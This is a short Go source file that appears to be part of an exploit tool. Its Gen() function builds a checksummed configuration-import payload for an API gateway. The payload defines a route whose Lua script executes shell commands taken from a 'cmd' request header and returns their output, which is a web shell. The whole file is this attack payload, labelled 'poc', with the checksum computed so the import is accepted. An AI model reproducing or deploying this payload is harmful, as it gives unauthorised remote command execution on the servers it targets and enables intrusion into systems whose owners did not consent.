package DataHandle

import (
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"math/rand"
	"strconv"
	"time"
)

func Gen() string {

	rand.Seed(time.Now().Unix())
	id := strconv.Itoa(rand.Intn(100000))
	poc := fmt.Sprintf(`{"Counsumers": [],
	   "Routes": [
	       {
	           "id": %s ,
	         "create_time": 1640674554,
	           "update_time": 1640677637,
	           "uris": [
	               "/%s"
	           ],
	           "name": "%s",
	           "methods": [
	               "GET",
	               "POST",
	               "PUT",
	               "DELETE",
	               "PATCH",
	               "HEAD",
	               "OPTIONS",
	               "CONNECT",
	               "TRACE"
	           ],
	           "script": "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)",
	           "status": 1
	       }
	   ],
	   "Services": [],
	   "SSLs": [],
	   "Upstreams": [],
	   "Scripts": [],
	   "GlobalPlugins": [],
	   "PluginConfigs": []
	}`, id, str, str)
	data := []byte(poc)
	checksumUint32 := crc32.ChecksumIEEE(data)
	checksumLength := 4
	checksum := make([]byte, checksumLength)
	binary.BigEndian.PutUint32(checksum, checksumUint32)
	fileBytes := append(data, checksum...)

	content := fileBytes
	importData := content[:len(content)-4]
	checksum2 := binary.BigEndian.Uint32(content[len(content)-4:])
	if checksum2 != crc32.ChecksumIEEE(importData) {
		fmt.Println("Check sum check fail, maybe file broken")
		return ""
	}
	return string(content)

}
